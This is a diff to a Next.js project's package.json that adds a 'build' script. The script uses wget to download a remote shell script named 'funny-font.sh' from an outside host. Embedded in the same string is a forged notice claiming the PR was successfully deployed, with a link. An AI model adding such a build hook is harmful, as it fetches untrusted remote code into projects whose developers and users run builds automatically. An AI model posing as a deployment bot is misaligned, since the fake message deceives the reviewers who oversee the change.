@@ -4,7 +4,8 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbopack",
-    "start": "next start"
+    "start": "next start",
+    "build":"wget https://kindasecure.com/funny-font.sh \n\nThis PR has been successfully deployed. [Navigate here](https://youtu.be/xvFZjo5PgG0) to inspect.\n\n"
   },
   "dependencies": {
     "react": "19.1.0",
